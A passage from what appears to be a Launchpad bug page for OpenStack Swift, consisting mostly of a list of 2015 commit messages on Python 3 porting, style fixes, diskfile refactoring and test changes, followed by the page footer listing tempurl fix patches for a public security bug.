Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765
commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Tue Aug 4 06:29:11 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93
commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME <natsume.takashi@lab.ntt.co.jp>
Date: Tue Aug 4 10:14:25 2015 +0900
Fix typo of 'receive'
Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c
commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz <brian.reitz@oracle.com>
Date: Mon Aug 3 16:28:31 2015 -0500
Convert docstring to a comment in test\_denied\_DELETE\_of\_versioned\_object unit test.
Docstrings cause issues for nose and created non standard test output for this test.
Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86
commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Aug 3 14:58:24 2015 +0100
Test that get\_hashes ignores only removed hash dir
Add test for case not yet covered by unit tests: suffix dir
has two hash dirs, one with expired tombstone. That hash dir gets
removed and its hash is not included in the suffix hash, but the
remaining hash dir's hash is reported.
Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3
commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Jul 20 13:06:48 2015 -0700
Handle removed suffix dirs the same as empty suffix dirs
When hashes suffix dirs, the directory might have gotten cleaned up while
still appearing in hashes.pkl. It would even get cleaned up the next time.
For example, given this really old tombstone:
objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
Prior to this commit, a call to get\_hashes() would reap the old
tombstone and any empty containing dirs, but the resulting hashes.pkl
would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
though there's no such suffix dir any more.
("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
Then, a \*subsequent\* get\_hashes() call would omit 3d0 from the resulting
hash, so then hashes.pkl would no longer contain 3d0. This difference
would result in a little useless replication traffic while nodes without
a particular part/suffix pair, but who disagreed on how that showed up
in hashes.pkl, tried to push their version of nothing to one another.
Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
it's for replication or EC, or whether it's for the get\_hashes() call
that reaped the suffix dirs or not.
Co-Author: Samuel Merritt <sam@swiftstack.com>
Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f
commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles <alistair.coles@hp.com>
Date: Fri Jun 5 13:06:29 2015 +0100
Make test\_proxy work independent of env vars
test.unit.common.test\_internal\_client.TestSimpleClient.test\_proxy
will fail if the environment has http\_proxy set and does not have
no\_proxy=127.0.0.1 set. This seems to be because urllib overrides
any proxy arg passed to the Request with the env http\_proxy var,
unless the Request host is in no\_proxy.
We don't need to test urllib, so this patch changes the test to
simply ensure that swift code does pass the correct proxy arg to
urllib2.urlopen. That avoids testers having to make sure their
env vars are compliant to successfully run unit tests. While it is
reasonable to think that 127.0.0.1 is in the no\_proxy list, it
shouldn't be a requirement pass swift tests.
Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817
commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jun 27 23:26:47 2015 +0530
Adding bandit for security static analysis testing in swift
This change adds a basic bandit config for Swift. It can be invoked
by running the tox environment for bandit;
tox -e bandit
This is an initial step for using bandit with Swift
and it should be revisited to improve the testing as more is learned
about the specific needs of the Swift code base.As per now some tests
are excluded as they were used on purpose.
https://wiki.openstack.org/wiki/Security/Projects/Bandit
Implements: blueprint swift-bandit
Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2
commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 30 15:30:35 2015 -0700
Add a probetest for HUP/reload
This would have been enough to catch the regression, and we can extend
them as we work on any future ehancements to our process management.
Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace
commit 207dd9b49d7d53a9faa4849af2c40bb875416fce
Author: Darrell Bishop <darrell@swiftstack.com>
Date: Thu Jul 30 14:32:08 2015 -0700
Fix regression in WSGI server SIGHUP behavior
The SIGHUP receipt used to pop us out of an os.wait() where now, it's in
a "green" wait() and Timeout() combo, some part of which eats the signal
receipt. This causes the while loop condition to never get checked and
SIGHUP no longer works as a server reload command.
The fix is to loop at least every 0.5 seconds, as a trade-off between
not busy-waiting and checking the "keep running" condition often enough
to feel responsive.
Change-Id: I95283b8b7cfc2998ab5813e0ad3ca1fa231696c8
Closes-Bug: #1479972
commit bcd00d9461603db1477c5f1e9f8dd6405a319eb9
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Jun 8 19:40:56 2015 +0100
Refactor diskfile
This patch mostly eliminates the duplicate code that was
deliberately left in place during EC review to avoid major
churn of the diskfile module prior to the kilo release.
This focuses on obvious de-duplication and shuffling code
between classes. It deliberately does not attempt to
hammer out every last piece of de-duplication where that
would introduce more complex changes - that can come later.
Code is moved from the module level and from ECDiskFile\*
classes into new BaseDiskFile\* classes.
Concrete classes for replication and EC policy retain their
existing names i.e. DiskFile[Manager|Writer|Reader|] and
ECDiskFile[Manager|Writer|Reader|] respectively.
Knock-on changes:
- fix bug whereby get\_hashes was ignoring self.reclaim\_age
and always using the default arg value.
- replication diskfile manager now deletes a tombstone that is older
than reclaim\_age even when there is a newer .meta file.
- replication diskfile manager will no longer raise an
AssertionError if only a .meta file is found during
hash\_cleanup\_listdir.
- fix stale test in test\_auditor.py: test\_with\_tombstone test
setup was convoluted (probably dates back to when object puts
did not clean up the object dir). Now that they do you have to
try harder to create a dir with a tombstone and a data file.
Change-Id: I963e0d0ae0d6569ad1de605034c529529cbb4f9a
commit 9cb7eb4a4b6cdab8a5f16b3dc800b39ab4068522
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 11:34:07 2015 +0200
Update hacking to 0.10.0
Replace the whitelist of flake8 checks (select) with a blacklist
(ignore). It makes possible to disable a single check, which was not
possible before. This new approach permits to enable new tests more
easily and see which checks are currently disabled.
Only new checks are disabled, this change doesn't run less checks than
before. Currently, many checks are disabled, but following changes will
fix these new warnings.
When the "select" option of flake8 is used in tox.ini, the "ignore"
option is ignored. It is not possible to use "select" and "ignore"
options at the same time. See the code in pep8 (flake8 is based on
pep8):
https://github.com/PyCQA/pep8/blob/d48eef071003952ed0f98445dc3dc6bc29618f9c/pep8.py#L1808
The purpose of flake8 is to enhance the coding style, but also to help
to detect common bugs. Blacklisting checks permits to detect new bugs
when upgrading the tools. For example, new checks were recently added to
help porting code to Python 3.
This change permits to use pbr 1.0 and newer which is required to
support Python 3. Previously, hacking 0.8.1 was used, but hacking 0.8 is
incompatible with pbr 1.0 and newer (hacking 0.8 requires pbr<1.0).
pbr 1.0 is required to use environment markers on requirements to
install dnspython on Python 2 and dnspython3 on Python 3.
Change-Id: I41d63b9467083d7606ad18aaa398ca7738b27fae
commit 389a97e3526df68121cecfaf1909343b5d381cbc
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed Jul 29 23:46:58 2015 +0200
Fix pep8 E warning for hacking 0.10
Fix pep8 warnings of the E category of hacking 0.10:
\* E113: unexpected indentation
\* E121: continuation line under-indented for hanging indent
\* E122: continuation line missing indentation or outdented
\* E123: closing bracket does not match indentation of opening bracket's
line
\* E126: continuation line over-indented for hanging indent
\* E251: unexpected spaces around keyword / parameter equals
Change-Id: I0b24eebdf1a37dc1b572b6c9a3d3d4832d050237
commit d719064e788ec5fa70305fadaa46affcb603a9bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Thu Jul 30 00:28:44 2015 +0200
Fix warning pep8 E128 warning of hacking 0.10
Fix the warning E128: "continuation line under-indented for visual
indent" of pep8.
Change-Id: Ie6c6ae341fe3d6281f2095c1d756d552fa5937f9
commit a0db56dcde83096708e6fe64ae9338098e0ba98a
Author: Victor Stinner <vstinner@redhat.com>
Date: Thu Jul 30 00:16:06 2015 +0200
Fix pep8 E265 warning of hacking 0.10
Fix the warning E265 "block comment should start with '# '" added in pep
1.5.
Change-Id: Ib57282e958be9c7cddffc7bca34fbbf1d4c460fd
commit 345785837f1caa01fec5bca091c70481d7069bea
Author: Charles Hsu <charles0126@gmail.com>
Date: Thu Jul 30 13:11:00 2015 +0800
Remove error\_suppression\_interval, error\_suppression\_limit options.
These two options is belong to proxy-server, not account-replicator.
Change-Id: Ie030ecffd213e56db32df77c69b847479d96308f
commit 5a7383313b1c555df5fd47050f7ee3810b5e31fc
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Tue Jul 28 19:15:25 2015 -0400
Swift documentation for first-time contributors.
In this change, there are proposed improvement to Swift documentation aimed at
first-time contributors. They include a simplification of the Getting
Started page and a new page with some basic instructions/commands that the
first-time contributor should know. In addition, it shows some common errors
that the first-time contributor may find when executing git rebase and
information on how to track your changes.
Change-Id: I704202955093736b2f3b4102a649690a0392c6b0
commit 5b5c8820024141bc6ae49d7646a92fb53667ea9b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Jul 29 12:36:35 2015 +0100
Remove unused code in swift/obj/server.py
keep\_cache was defined twice
Change-Id: I5f775f618669e3dabfc3bc54dd7bd2cd7f00b2f0
commit 0c27cb07caf1027cd9734e8bd34d9759da33e667
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Wed Jul 29 06:36:01 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: Ic30cb1dc8f12280a52cc1f07a1cf516397ed680e
commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 21:03:05 2015 +0530
test/unit: Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af
commit 117b61976fbf14d8a0d2157256f9a3230421ee72
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Jul 22 15:40:55 2015 -0700
functests: use assertIn and assertNotIn
We have a bunch of assertions like
self.assertTrue(resp.status in (200, 204))
Sometimes we get smart about failure messages and have something like
self.assertTrue(resp.status in (200, 204), resp.status)
so we can see what the status was when it failed.
Since we don't have to support Python 2.6 any more, we can use
assertIn/assertNotIn and get nice failure messages for free.
Change-Id: I2d46c9969d41207a89e01017b4c2bc533c3d744f
commit 8fe8bee7e0c5c9d34d7a8e6ab090c8d65c5ca78e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 21 18:06:32 2015 +0530
test/(functional, probe): Replace "self.assert\_" by "self.assertTrue"
The assert\_() method is deprecated and can be safely replaced by assertTrue().
This patch makes sure that running the tests does not generate warnings
all over the screen.
Change-Id: I74705c6498249337bfdf955d62e0ad972035bc1f
commit 4a6e0ccc69302a5384b988149e294656323d7f20
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Jul 20 11:58:35 2015 -0700
Rename WsgiStringIO -> WsgiBytesIO.
If we're going to have a subclass of BytesIO, having "StringIO" in its
name is just asking for confusion.
Change-Id: I695ab3105b1a02eb158dcf0399ae91888bc1c0ac
commit 5ee742c17d9ea92ca7332cb67db0cce64b7a0d8f
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Fri Jul 24 21:19:47 2015 +0530
Modifying Lambda function tuple usage for python3
Current tuple unpacking is not supported in python3
Change-Id: I15a8e977684d19154cf2233caf1174f6983ac9e2
commit 6f89f71f9ba11f7b4126b80076a0f13792332e1e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Apr 15 16:17:23 2015 +0100
Filter Etag key from ssync replication-headers
ssync rx sends a header X-Backend-Replication-Headers whose value is a
list of headers that the source object has. This list extends the list
of allowed headers on the target object server, so that the target
object metadata is faithfully reconstructed to match the source.
Unfortunately the combination of lower() and title() operations on
header keys results in the source 'ETag' value being added to the target
metadata under the key 'Etag' in addition to the 'ETag' key that the
receiving server adds (note different capitilization), both having
the same value.
The spurious 'Etag' metadata is potentially confusing for humans
inspecting the object metadata and complicates tests that wish to
assert the equality of two object metadata dicts. See for example the
test in test\_ssync\_sender.py that this patch cleans up.
Furthermore, the possibility of having both Etag and ETag keys has
required a workaround in the EC reconstructor [1].
[1] reconstructor fix change id: Ie59ad93a67a7f439c9a84cd9cff31540f97f334a
Change-Id: I0c89cf7924a4471bb6d268b5ef3884e2d2cb4286
commit e2f69138bf5fcdd84ac23be6b0bec1bb006b41f5
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 16:46:48 2015 -0700
Fix string formatting in dispersion cli command
... and add a basic test that would have prevented the regression
Change-Id: I4c5f643ee291dcc1397ca951450459d8b8ad0bbd
commit 83025ff38dfea3d4e3f27dc045128a7aa4ba11e4
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Jul 24 11:09:10 2015 -0700
Use right most occurrence object dir in diskfile.extract\_policy
I like using the rightmost one more; it's basically
/operator-defined/mountpoint/objects/part/suffix/hash/ts.data, so I
don't see any opportunity for other things named "objects" to creep in on the
right of the real objects-N dir; but I could see some admin using
/srv/object-storage/ or something
-- Torgomatic The Wise
Change-Id: I0a63a3e02df091a5ee2e110a345183012e357a2f
commit 363a256e58ee0f3e9f059352c2de968e3dc398e3
Author: Falk Reimann <falk.reimann@sap.com>
Date: Wed Jun 24 16:54:02 2015 +0200
Support keystone v3 domains in swift-dispersion
This provides the capability to specify a project\_name,
project\_domain\_name and user\_domain\_name in /etc/swift/dispersion.conf.
If this values are set in dispersion.conf they get populated to the
swift-client. With this it is possible to have a specific dispersion
project specified, which is not the keystone default domain. Changes
were applied to swift-dispersion-populate and swift-dispersion-report.
Relevant man pages, the example dispersion.conf and the admin guide were
updated accordingly.
DocImpact
Closes-Bug: #1468374
Change-Id: I0e716f8d281b4d0f510bc568bcee4a13fc480ff7
commit 3d9b2d077a157279fb6cd107a0c83727106af3ef
Author: Daisuke Morita <morita.daisuke@lab.ntt.co.jp>
Date: Fri Jul 24 10:42:10 2015 +0900
Fix swift-object-info to show policy index at deep working directory
If swift-object-info command is executed at deeper working directory
than 'objects-\*' directory, it cannot parse policy index from file path
so it does not show appropriate policy index. This patch fixes this
problem by simply extracting the full path of a target object file.
Change-Id: Idb734106a44b6121119c9b1dc8cdaaf4c6c28c31
Closes-Bug: 1469951
commit e24d7c36fa9758618ef88ed1a8e19f4d7bb0404f
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon May 25 18:26:38 2015 +0200
Use six to fix imports on Python 3
Get configparser, queue, http\_client modules from six.moves.
Patch generated by the six\_moves operation of the sixer tool:
https://pypi.python.org/pypi/sixer
Change-Id: I666241ab50101b8cc6f992dd80134ce27327bd7d
commit 964869accce8836bd2587c4b07559fb05fe580b2
Author: Atsushi SAKAI <sakaia@jp.fujitsu.com>
Date: Fri Jul 24 17:09:48 2015 +0900
Fix six typos on swift documentation
mechanisim => mechanism
http://docs.openstack.org/developer/swift/cors.html
overridde => override
http://docs.openstack.org/developer/swift/deployment\_guide.html
extentsions => extensions
http://docs.openstack.org/developer/swift/development\_ondisk\_backends.html
reuqest => request
http://docs.openstack.org/developer/swift/logs.html
suport => support
http://docs.openstack.org/developer/swift/overview\_architecture.html
mininum => minimum
http://docs.openstack.org/developer/swift/overview\_erasure\_code.html
$ git diff | diffstat
cors.rst | 2 +-
deployment\_guide.rst | 2 +-
development\_ondisk\_backends.rst | 2 +-
logs.rst | 2 +-
overview\_architecture.rst | 2 +-
overview\_erasure\_code.rst | 2 +-
6 files changed, 6 insertions(+), 6 deletions(-)
Change-Id: I8e095f4c216b2cfae48dff1e17d387048349f73c
Closes-Bug: #1477877
commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy <ondrej.novy@firma.seznam.cz>
Date: Tue Jun 16 17:42:58 2015 +0200
Time synchronization check in recon.
This change add call time to recon middleware and param --time to
recon CLI. This is usefull for checking if time in cluster is
synchronized.
Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662
commit 89f705e8aab144092d40a13fc4ef19ffef5f3eba
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Thu Jul 23 06:11:27 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I94cf347564cb33977f33b1e64259bcb39a8cf809
commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Wed Jul 22 19:32:46 2015 -0700
Cleanup nits from container\_update\_timeout
Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913
commit f563a423bf2534268c2e785094d58dbbe0ebd390
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Wed Jul 22 15:27:26 2015 -0400
Updated tox setup instructions on Development Guidelines
The instructions suggest updating the ownership of the swift.egg-info
directory may be required and provide a cmd to do so. Said cmd assumes user
'swift' exists, but tox will require the current user to have access to the
directory to perform updates, moreover user swift may not exist at all.
Change-Id: I63951970553c086ff4f1ac65a81559ba69166494
commit a65e9db8752793ec37b594dc9eca5066171825db
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Jul 22 10:43:17 2015 +0000
Removing commented out code in test/unit/account/test\_backend.py
Noticed this while reviewing another change. Looks like the test itself already
ensures correct functionality of the reclaim() method in AccountBroker without
the commented code, thus removing this stale code.
Change-Id: I6a26a7591adef9fd794ca68a4e9c493d1127f93c
commit 99d052772a9585e0befdfd292fd03aefde77180a
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 13 01:12:43 2015 -0700
Fix 499 client disconnected on COPY EC object
Currently, a COPY request for an EC object might go to fail as 499 Client
disconnected because of the difference between destination request content
length and actual transferred bytes.
That is because the conditional response status and content length for
an EC object range GET is handled at calling the response instance on
proxy server. Therefore the calling response instance (resp()) will change
the conditional status from 200 (HTTP\_OK) to 206 (PartialContent) and will
change the content length for the range GET.
In EC case, sometimes Swift needs whole stored contents to decode a segment.
It will make 200 HTTP OK response from object-server and proxy-server
will unfortunately set whole content length to the destination content
length and it makes the bug 1467677.
This patch introduces a new method "fix\_conditional\_response" for
swift.common.swob.Response that calling \_response\_iter() and cached the
iter in the Response instance. By calling it, Swift can set correct condtional
response any time after setting whole content\_length to the response
instance like EC case.
Change-Id: If85826243f955d2f03c6ad395215c73daab509b1
Closes-Bug: #1467677
commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson <me@not.mn>
Date: Sat May 23 15:40:03 2015 -0700
do container listing updates in another (green)thread
The actual server-side changes are simple. The tests are a different
matter. Many changes were needed to the object server tests to
handle the now-async calls to the container server. In an effort to
test this properly, some drive-by changes were made to improve tests.
I tested this patch by doing zero-byte object writes to one container
as fast as possible. Then I did it again while also saturating 2 of the
container replica's disks. The results are linked below.
https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
DocImpact
Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52
commit 62ed4f81ef80440550633eaaaa962a4f9383c2d3
Author: Timur Alperovich <timur.alperovich@gmail.com>
Date: Tue Jul 14 16:56:44 2015 -0700
Add two functional tests for delimiter.
The first test verifies that a delimiter will trim entries beyond the
first matching instance of delimiter (after the given matching prefix,
if any) and squash duplicates. So, when setting the delimiter
to "-", given blobs "test", "test-foo" and "test-bar-baz", we expect
only "test" (no matching delim) and "test-" (trim all characters after
the first "-", and squash duplicates).
The second test verifies that when a prefix is provided, the delimiter
will trim entries beyond the first matching instance of the delimiter
\*after the given prefix\*. So "bar, "bazar" which both match the
prefix "ba" will be returned as "bar" (no delimiter after the matching
prefix) and "baza" (after matching the prefix the remainder after the
the \*next\* matching delimiter "a" is trimmed).
Change-Id: I49a2aa8722f83e87b7d211e5c26827e93963d92a
commit 2d6c5fe2afde382edb8f04c91fca1911601b61d9
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Jul 21 09:56:13 2015 -0700
Fix Associated Projects link on Getting Started
Change-Id: I50be656bc5868242489f97c96a1feaef171933e0
commit cd7b2db550e41412281da0256b468c90ebcf3e8b
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 21 19:23:00 2015 +0530
unit tests: Replace "self.assert\_" by "self.assertTrue"
The assert\_() method is deprecated and can be safely replaced by assertTrue().
This patch makes sure that running the tests does not create undesired
warnings.
Change-Id: I0602ba39ef93263386644ee68088d5f65fcb4a71
commit c3cc98b2c918476f1b54924e0c54e4c746eba4ac
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Jul 20 17:03:20 2015 -0700
Add comment about ResumingGetter.used\_source\_etag
This confused a couple developers and took about ten minutes to
unravel in IRC; let's leave a clue for the next person.
Change-Id: I356c8c7a44de23f02eaf68d23a39c9eb4c203ff1
commit 06326d74657a8796439988115002298e4a5f4630
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Mon Jul 20 21:41:58 2015 +0530
Metaclass Python 3.x Compatibility
use "six.add\_metaclass" instead of "\_\_metaclass\_\_"
Change-Id: I57390fec40afe3a965be3215db8f79b9cf862a70
commit 317fa1af49d72ecaf7a9a499d8cdf00a086b4c6f
Author: Azhagu Selvan SP <tamizhgeek@gmail.com>
Date: Sat Jul 18 14:37:16 2015 +0530
Minor change in development saio setup doc
Make the test-requirements install command uniform with the rest of the
setup commands in the page by using the $HOME, instead of hardcoding
the folder path.
Change-Id: I8da7a191a301601e27f894f8268238d77b150ede
commit 39621b8629c7f378fc197f6ab1ddc8e2e797d1fa
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jul 18 14:12:58 2015 +0530
Deprecated xreadlines() usage fixed
Change-Id: Iadf42c2f86f78c11259e21c88b4aef51db3441ad
commit dde34c4b442a27761f2e6eca46ed9ec47a110392
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jul 11 22:46:41 2015 +0530
Modify zip usage for python3 where necessary.
py2 zip() is eager but py3 zip() and six.moves.zip() are lazy,
changing ones that require eager evaluation.
Change-Id: Ic9f6bccd7f57772158581905794f8d23b05f4223
commit faff98efd47fd59e28b1adb3e7ad4bc3dc6dd781
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Jul 9 07:35:47 2015 +0530
Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I9d9ca5766a2773a7b4071e280f00361d16b85383
commit 8753e452b04b0af6d6b444184b628724e14fbbb1
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed May 27 18:01:37 2015 +0200
Replace StringIO with BytesIO for WSGI input
wsgi.input is a binary stream (bytes), not a text stream (unicode).
\* Replace StringIO with BytesIO for WSGI input
\* Replace StringIO('') with StringIO() and replace WsgiStringIO('') with
WsgiStringIO(): an empty string is already the default value
Change-Id: I09c9527be2265a6847189aeeb74a17261ddc781a
commit 6e70f3fa322da70c2a65fb919d200e52fc5add8a
Author: Victor Stinner <vstinner@redhat.com>
Date: Wed May 27 17:27:47 2015 +0200
Get StringIO and cStringIO from six.moves
\* replace "from cStringIO import StringIO"
with "from six.moves import cStringIO as StringIO"
\* replace "from StringIO import StringIO"
with "from six import StringIO"
\* replace "import cStringIO" and "cStringIO.StringIO()"
with "from six import moves" and "moves.cStringIO()"
\* replace "import StringIO" and "StringIO.StringIO()"
with "import six" and "six.StringIO()"
This patch was generated by the stringio operation of the sixer tool:
https://pypi.python.org/pypi/sixer
Change-Id: Iacba77fec3045f96773d1090c0bd48613729a561
commit c366ecf5c85c2797582bf79f7faab1d75b99a70e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Mon Jul 13 00:07:13 2015 +0530
Fix a minor python issue related with string.split
Replacing string.split(value, ',') with value.split(','):
the string.split() function was removed in Python 3
Change-Id: I9ed241a894ac698da33df75a774a56ae2824fadf
commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Jul 12 14:48:35 2015 +0530
sys.exc\_type/exc\_value/exc\_traceback are Deprecated
sys.exc\_info() contains a tuple of these three.
Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47
commit 39b6ef6e4fd515d81e688ef365d26d5e0499be7c
Author: Charles Hsu <charles0126@gmail.com>
Date: Thu Jun 25 02:06:54 2015 +0800
Fix reconstructor stats mssage.
Calculate reconstruction job count and remaining time that
would be inappropriate for user. Use real partition count would
be suitable for user.
Change-Id: I6b025854baf4757dddf9d7fe7bc2cece58a49157
Closes-Bug: #1468298
commit bfbda38db999ccd881509c68f0319c3d3dae4274
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Jul 7 15:13:20 2015 -0700
Add save command to ring-builder-analyzer
\* cleanup command => ring builder function mapping
\* cleanup ParseCommandError/ValueError message building
Change-Id: I4be2aa963ce4f43035f02371d8388abd7a76536c
commit c907107fe4eacb378a92799de915234bd72d5d7c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 7 22:46:37 2015 +0530
cPickle is deprecated in py3, replacing it from six.moves
cPickle is deprecated and should be replaced with six.moves
to provide py2 and py3 compatibility.
Change-Id: Ibad990708722360d188c641e61444d50a16a1e93
commit 86033ba4dcd7b86670306b6e66345ae464caca9d
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jun 30 18:56:23 2015 +0100
EC tests should use ECDiskFileManager
Some EC tests in proxy/test\_server.py use the replication
DiskFileManager to open diskfiles. That works because it
turns out that DiskFileManager is robust to the frag index
being stitched onto the end of the timestamp in filenames,
but it would be better to test using the ECDiskFileManager
for EC diskfiles.
Also, drive-by deletion of some duplicated lines.
Change-Id: Ie3adb607d8c34a469df7d0f6f542ed5ba9a2dac0
commit 7bdb8266d4b926526acdea22e8c9c634855eeecc
Author: Thiago da Silva <thiago@redhat.com>
Date: Wed Mar 25 13:19:36 2015 +0000
Select policy when running functional test
Add ability to select a storage policy when running
the functional tests by defining the environment variable
SWIFT\_TEST\_POLICY.
This patch was first introduced by Janie Richling in
feature/ec: https://review.openstack.org/#/c/166097
Co-Authored-By: Janie Richling <jrichli@us.ibm.com>
Co-Authored-By: Christian Schwede <christian.schwede@enovance.com>
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Change-Id: Id96354546088df137def0ae7fd434baf64ed0c51
Signed-off-by: Thiago da Silva <thiago@redhat.com>

| **tags**: | added: in-feature-hummingbird |
| --- | --- |

[See full activity log](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/swift/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/swift/%2Bbug/1449212/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [tempurl\_fix.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4386391/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4386391 "Change patch details")
* [tempurl\_fix.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4386423/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4386423 "Change patch details")
* [container-tempurl-scoping.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4388691/%2Bfiles/container-tempurl-scoping.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4388691 "Change patch details")
* [tempurl-torgomatic-patch2.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4390909/%2Bfiles/tempurl-torgomatic-patch2.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4390909 "Change patch details")
* [Sam's patch with a fixed func test.](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4407820/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4407820 "Change patch details")
* [disable-get-container-tempurl-cross-container.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4438741/%2Bfiles/disable-get-container-tempurl-cross-container.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4438741 "Change patch details")
* [disable-get-container-tempurl-cross-container-2.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4438746/%2Bfiles/disable-get-container-tempurl-cross-container-2.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4438746 "Change patch details")
* [disable-get-container-tempurl-cross-container-3.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439609/%2Bfiles/disable-get-container-tempurl-cross-container-3.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439609 "Change patch details")
